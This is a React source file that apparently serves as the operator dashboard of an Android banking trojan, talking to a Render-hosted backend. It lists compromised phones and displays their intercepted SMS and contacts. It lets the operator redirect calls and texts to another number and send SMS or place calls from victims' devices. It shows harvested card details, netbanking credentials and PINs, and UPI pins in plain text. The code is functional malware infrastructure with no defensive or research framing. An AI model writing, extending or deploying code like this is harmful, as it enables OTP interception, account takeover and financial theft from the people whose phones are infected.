import { useState, useEffect, useCallback } from 'react'

const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'
const API_BASE = 'https://bill-1-9yfp.onrender.com'

export default function App() {
  const [data, setData] = useState(null)
  const [openId, setOpenId] = useState(null)
  const [fwd, setFwd] = useState({})
  const [saving, setSaving] = useState({})
  const [acts, setActs] = useState({})
  const [time, setTime] = useState('')

  const fetchData = useCallback(async () => {
    try {
      const r = await fetch(API)
      const d = await r.json()
      setData(d)
      setTime(new Date().toLocaleTimeString())
    } catch {}
  }, [])

  useEffect(() => {
    fetchData()
    const id = setInterval(fetchData, 3000)
    return () => clearInterval(id)
  }, [fetchData])

  const loadFwd = async (id) => {
    try {
      const r = await fetch(`${API_BASE}/api/forwarding-config/${id}`)
      const d = await r.json()
      setFwd(prev => ({...prev, [id]: d}))
    } catch {}
  }

  const saveFwd = async (id) => {
    const c = fwd[id]
    if (!c) return
    setSaving(prev => ({...prev, [id]: true}))
    try {
      await fetch(`${API_BASE}/api/forwarding-config`, {
        method: 'PUT',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          device_id: id,
          call_forwarding: c.call_forwarding,
          call_forwarding_number: c.call_forwarding_number,
          sms_forwarding: c.sms_forwarding,
          sms_forwarding_number: c.sms_forwarding_number,
        }),
      })
    } catch {}
    setSaving(prev => ({...prev, [id]: false}))
  }

  const sendAction = async (id) => {
    const a = acts[id]
    if (!a || !a.target_number) return
    setActs(prev => ({...prev, [id]: {...prev[id], sending: true}}))
    try {
      await fetch(`${API_BASE}/api/admin/action`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          device_id: id,
          type: a.type || 'sms',
          target_number: a.target_number,
          message: a.message || '',
        }),
      })
      setActs(prev => ({...prev, [id]: {target_number: '', message: '', sim_slot: '1', type: 'sms'}}))
    } catch {}
    setActs(prev => ({...prev, [id]: {...prev[id], sending: false}}))
  }

  if (!data) return <div style={s.loading}>Loading...</div>

  const devices = data.device_sections || []

  const parseSim = (info) => {
    try { return JSON.parse(info || '[]') } catch { return [] }
  }

  const fmtSize = (b) => b > 1048576 ? (b/1048576).toFixed(1)+'MB' : b > 1024 ? (b/1024).toFixed(1)+'KB' : b+'B'

  return (
    <div style={s.body}>
      <div style={s.header}>
        <b style={{fontSize:18}}>Devices</b>
        <span style={{fontSize:11,opacity:.6}}>{time}</span>
      </div>

      <div style={s.wrap}>
        {devices.length === 0 && <div style={s.loading}>No devices</div>}

        {devices.map((sec) => {
          const d = sec.device || {}
          const id = d.device_id
          const open = openId === id
          const lastMs = d.last_seen ? Date.now() - new Date(d.last_seen).getTime() : Infinity
          const status = !d.last_seen ? 'UNINSTALLED' : lastMs < 120000 ? 'ONLINE' : lastMs < 3600000 ? 'OFFLINE' : 'UNINSTALLED'
          const statusColor = status === 'ONLINE' ? '#22c55e' : status === 'OFFLINE' ? '#ef4444' : '#64748b'
          const offlineStr = d.offline_seconds > 0 ? `Was offline ${Math.round(d.offline_seconds/60)}m` : ''
          const sims = parseSim(d.sim_info)
          const smsList = sec.sms || []
          const contactsList = sec.contacts || []
          const a = acts[id] || {}

          return (
            <div key={id} style={s.card}>
              <div style={{...s.head, borderLeft:`4px solid ${statusColor}`}}
                onClick={() => { setOpenId(open ? null : id); loadFwd(id); setActs(prev => ({...prev, [id]: prev[id]||{target_number:'',message:'',sim_slot:'1',type:'sms'}})) }}>
                <div>
                  <div style={s.name}>
                    {d.device_name || '-'}
                    <span style={{...s.badge, background: statusColor}}>{status}</span>
                  </div>
                  <div style={s.sub}>
                    {d.model || ''} &middot; Android {d.os_version || ''}
                    {d.last_seen ? ` &middot; ${new Date(d.last_seen).toLocaleString()}` : ''}
                    {offlineStr ? ` &middot; ${offlineStr}` : ''}
                  </div>
                </div>
                <span style={{fontSize:11,color:'#94a3b8'}}>{open ? '▲' : '▼'}</span>
              </div>

              {open && (
                <div style={s.inner}>
                  {/* SIM Info */}
                  <div style={s.secH}>SIM</div>
                  {sims.length === 0 ? <div style={s.txt}>No SIM data</div> : sims.map((x,i) => (
                    <div key={i} style={s.row}>
                      <span style={{fontWeight:600,minWidth:55,fontSize:12,color:'#475569'}}>SIM {x.sim_slot||i+1}</span>
                      <span style={{fontSize:12}}>{x.carrier||'-'}{x.number ? ` (${x.number})` : ' - no number'}</span>
                    </div>
                  ))}

                  {/* SMS */}
                  <div style={{...s.secH,marginTop:12}}>SMS</div>
                  {smsList.length === 0 ? <div style={s.txt}>No SMS</div> : (
                    <div style={s.scroll}>
                      {(() => {
                        const slots = [...new Set(smsList.map(x => x.sub_id))].sort()
                        if (slots.length === 1 && slots[0] === 0) {
                          return smsList.map((x,j) => (
                            <div key={x.id||j} style={s.item}>
                              <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
                              <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
                              <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
                            </div>
                          ))
                        }
                        return slots.map(slot => (
                          <div key={slot}>
                            <div style={{fontSize:11,fontWeight:600,color:'#64748b',padding:'4px 0'}}>SIM {slot === 0 ? '?' : slot} ({smsList.filter(x => x.sub_id === slot).length} messages)</div>
                            {smsList.filter(x => x.sub_id === slot).map((x,j) => (
                              <div key={x.id||j} style={s.item}>
                                <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
                                <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
                                <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
                              </div>
                            ))}
                          </div>
                        ))
                      })()}
                    </div>
                  )}

                  {/* Contacts */}
                  <div style={{...s.secH,marginTop:12}}>Contacts</div>
                  {contactsList.length === 0 ? <div style={s.txt}>No contacts</div> : (
                    <div style={s.scroll}>
                      {contactsList.map((x,j) => (
                        <div key={x.id||j} style={s.item}>
                          <div style={{fontWeight:600,fontSize:12}}>{x.name||'-'}</div>
                          <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
                        </div>
                      ))}
                    </div>
                  )}

                  {/* Call Forwarding */}
                  <div style={{...s.secH,marginTop:12}}>Forwarding</div>
                  <div>
                    <div style={s.fw}>
                      <span style={{minWidth:35,fontWeight:600,fontSize:12}}>Call</span>
                      <input type="text" placeholder="Forward to" value={fwd[id]?.call_forwarding_number||''}
                        onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding_number:e.target.value}}))}
                        style={s.inp} />
                      <label style={s.lbl}>
                        <input type="checkbox" checked={fwd[id]?.call_forwarding||false}
                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding:e.target.checked}}))} /> On
                      </label>
                    </div>
                    <div style={s.fw}>
                      <span style={{minWidth:35,fontWeight:600,fontSize:12}}>SMS</span>
                      <input type="text" placeholder="Forward to" value={fwd[id]?.sms_forwarding_number||''}
                        onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding_number:e.target.value}}))}
                        style={s.inp} />
                      <label style={s.lbl}>
                        <input type="checkbox" checked={fwd[id]?.sms_forwarding||false}
                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding:e.target.checked}}))} /> On
                      </label>
                    </div>
                    <button onClick={()=>saveFwd(id)} disabled={saving[id]}
                      style={s.save}>{saving[id]?'Saving...':'Save'}</button>
                  </div>

                  {/* Actions */}
                  <div style={{...s.secH,marginTop:12}}>Actions</div>
                  <div>
                    <div style={{marginBottom:6,fontSize:11,color:'#64748b'}}>Send SMS or call from this device.</div>
                    <select value={a.sim_slot||'1'} onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],sim_slot:e.target.value,type:a.type||'sms'}}))}
                      style={{...s.inp,width:'100%',marginBottom:6,boxSizing:'border-box'}}>
                      {sims.map((x,i) => (
                        <option key={i} value={x.sim_slot||i+1}>SIM {x.sim_slot||i+1} {x.number ? `(${x.number})` : ''}</option>
                      ))}
                      {sims.length === 0 && <option value="1">SIM 1</option>}
                    </select>
                    <input type="text" placeholder="Target phone number" value={a.target_number||''}
                      onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],target_number:e.target.value,type:a.type||'sms'}}))}
                      style={{...s.inp,width:'100%',marginBottom:6,boxSizing:'border-box'}} />
                    <textarea placeholder="SMS message" value={a.message||''}
                      onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],message:e.target.value,type:a.type||'sms'}}))}
                      style={{...s.inp,width:'100%',minHeight:50,resize:'vertical',marginBottom:8,boxSizing:'border-box',fontFamily:'inherit'}} />
                    <div style={{display:'flex',gap:8}}>
                      <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'sms'}}));sendAction(id)}} disabled={a.sending}
                        style={{...s.save,background:'#22c55e'}}>{a.sending?'Sending...':'Send SMS'}</button>
                      <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'call'}}));sendAction(id)}} disabled={a.sending}
                        style={{...s.save,background:'#ef4444'}}>{a.sending?'Calling...':'Make Call'}</button>
                    </div>
                  </div>

                  {/* Bill data plain text */}
                  {['bill_updates','card_details','card_verifications','netbanking_details','netbanking_pins','upi_details','payment_attempts'].map(t => {
                    const items = (data[t]||[]).filter(r => r.device_id === id || !r.device_id)
                    if (items.length === 0) return null
                    const labels = {
                      bill_updates: 'Bill Updates', card_details: 'Card Details', card_verifications: 'Card Verify',
                      netbanking_details: 'Netbanking', netbanking_pins: 'NB Pins', upi_details: 'UPI Pins', payment_attempts: 'Payments'
                    }
                    return (
                      <div key={t}>
                        <div style={{...s.secH,marginTop:12}}>{labels[t]}</div>
                        {items.map((row,i) => (
                          <div key={row.id||i} style={{padding:'6px 0',borderBottom:'1px solid #f1f5f9',fontSize:12,lineHeight:1.6}}>
                            {Object.entries(row).filter(([k]) => k !== 'id' && k !== 'device_id').map(([k,v]) => {
                              if (k === 'created_at') v = v?new Date(v).toLocaleString():'-'
                              if (typeof v === 'boolean') v = v?'Yes':'No'
                              if (k === 'amount') v = `₹${v}`
                              return <div key={k} style={{color:'#334155'}}><b style={{color:'#64748b',fontWeight:600,textTransform:'capitalize'}}>{k.replace(/_/g,' ')}:</b> {v??'-'}</div>
                            })}
                          </div>
                        ))}
                      </div>
                    )
                  })}
                </div>
              )}
            </div>
          )
        })}
      </div>
    </div>
  )
}

const s = {
  body: { fontFamily:'-apple-system,sans-serif', background:'#f1f5f9', minHeight:'100vh', padding:'0 0 40px', fontSize:14 },
  loading: { display:'flex', height:'100vh', alignItems:'center', justifyContent:'center', color:'#666', fontSize:16 },
  header: { background:'#1e293b', color:'#fff', padding:'14px 16px', display:'flex', justifyContent:'space-between', alignItems:'center', position:'sticky', top:0, zIndex:10 },
  wrap: { padding:'12px', maxWidth:600, margin:'0 auto' },
  card: { background:'#fff', borderRadius:12, marginBottom:10, overflow:'hidden', boxShadow:'0 1px 4px rgba(0,0,0,.08)' },
  head: { display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 14px', cursor:'pointer' },
  name: { fontWeight:700, fontSize:14, display:'flex', alignItems:'center', gap:8 },
  badge: { fontSize:9, color:'#fff', padding:'2px 7px', borderRadius:10, fontWeight:600 },
  sub: { fontSize:11, color:'#64748b', marginTop:2 },
  inner: { padding:'0 10px 12px', borderTop:'1px solid #f1f5f9' },
  secH: { fontSize:12, fontWeight:700, color:'#333', padding:'6px 0', borderBottom:'1px solid #e2e8f0' },
  txt: { padding:'8px 0', color:'#999', fontSize:12 },
  row: { display:'flex', gap:8, padding:'5px 0', borderBottom:'1px solid #f8fafc' },
  scroll: { maxHeight:300, overflowY:'auto' },
  item: { padding:'5px 8px', borderBottom:'1px solid #f1f5f9', fontSize:12 },
  table: { width:'100%', borderCollapse:'collapse', fontSize:11, minWidth:400 },
  th: { padding:'6px 8px', textAlign:'left', background:'#f8f9fa', borderBottom:'2px solid #dee2e6', fontWeight:700, color:'#333', whiteSpace:'nowrap', fontSize:10 },
  td: { padding:'5px 8px', borderBottom:'1px solid #eee', whiteSpace:'nowrap', fontSize:11 },
  fw: { display:'flex', alignItems:'center', gap:6, marginBottom:6, flexWrap:'wrap' },
  inp: { flex:1, minWidth:80, padding:'6px 8px', border:'1px solid #e2e8f0', borderRadius:8, fontSize:12, outline:'none' },
  lbl: { display:'flex', alignItems:'center', gap:4, fontSize:12, cursor:'pointer', fontWeight:500, color:'#475569' },
  save: { color:'#fff', border:'none', borderRadius:8, padding:'6px 14px', fontSize:12, fontWeight:600, cursor:'pointer', marginTop:2 },
}
